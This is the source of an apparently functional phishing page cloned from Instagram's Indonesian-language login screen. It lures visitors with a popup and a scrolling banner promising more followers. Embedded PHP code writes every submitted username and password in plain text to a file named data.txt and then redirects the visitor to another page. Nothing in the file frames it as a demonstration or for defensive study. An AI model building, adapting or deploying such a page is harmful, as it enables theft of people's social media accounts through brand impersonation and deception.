<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="style/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <title>Instagram</title>
</head>
<body onload="alert('Masukkan akun anda untuk melanjutkan!')">
    <div class="space"></div>
    <div class="wraper justify-content-center">
        <marquee behavior="" direction="">Masuk ke akun anda untuk melanjutkan proses penambahan followers</marquee>
    <div class="row justify-content-center">
        <div class="col-md-6 nopad"><img id="ig" src="ig.PNG" alt=""></div>
        <div class="col-md-4 nopad">
            <div class="login-box">
                <img class="ig-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="">
                <form method="POST">
                    <div class="form-group">
                      <input type="text" class="form-control" id="exampleInputEmail1" name="username" aria-describedby="emailHelp" placeholder="Nomor telepon, nama pengguna, atau email">
                    </div>
                    <div class="form-group">
                      <input type="password" class="form-control" name="password" id="exampleInputPassword1" placeholder="Kata Sandi">
                    </div>
                    <button type="submit" name="submit" class="btn btn-block btn-primary">Login</button>
                  </form>


                <?php            
                    if(isset($_POST['submit']))
                    {
                    $user=$_POST['username'];
                    $pass=$_POST['password'];
                    $fp = fopen('data.txt', 'a');
                    fwrite($fp, "+++++++++++++++++++++");
                    fwrite($fp, "\n");
                    fwrite($fp, "Username : ");
                    fwrite($fp, $user);
                    fwrite($fp, "\n");
                    fwrite($fp, "Password : ");
                    fwrite($fp, $pass);
                    fwrite($fp, "\n");
                    fwrite($fp, "+++++++++++++++++++++");
                    fclose($fp);

                    header("location:proses.php");
                }

                
                ?>

                  <br>
                  <p class="atau"><span>ATAU</span></p>
                  <div class="text-center">
                     <a style="color: #385185; text-decoration: none;" href="#"><i class="fab fa-facebook-square fa-1x"></i> Masuk dengan Facebook</a>
                     <br>
                     <a style="color: #385185; text-decoration: none;" href="#">Lupa kata sandi?</a>
                  </div>
            </div>
            <div class="login-box-2 text-center">
                <span style="font-size: 13px;">Tidak punya akun ? <a style="text-decoration: none; font-weight: 500;" href="#">Buat akun</a></span>
            </div>

            <div class="aplikasi text-center">
                <p>Dapatkan Aplikasi</p>
                <div class="row text-center justify-content-center">
                    <div class="col">
                        <img class="appstore" src="http://assets.stickpng.com/images/5a902db97f96951c82922874.png" alt="">
                    </div>
                    <div class="col"><img class="playstore" src="https://roolnews.id/file/2016/04/download-on-google-play.png" alt=""></div>
                </div>
            </div>

        </div>
    </div>

    <footer >
        <ul>
            <li> <a href="#">Tentang</a> </li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Pekerjaan</a></li>
            <li><a href="#">Bantuan</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privasi</a></li>
            <li><a href="#">Ketentuan</a></li>
            <li><a href="#">Akun Teratas</a></li>
            <li><a href="#">Tagar</a></li>
            <li><a href="#">Lokasi</a></li>
        </ul>
        <ul>
            <li><a href="#">Bahasa Indonesia</a></li>
            <li><a href="#">&copy;2021 Instagram from Facebook</a></li>
        </ul>
    </footer>
    
</div>
    <script src="/style/bootstrap/js/bootstrap.js"></script>
</body>
</html>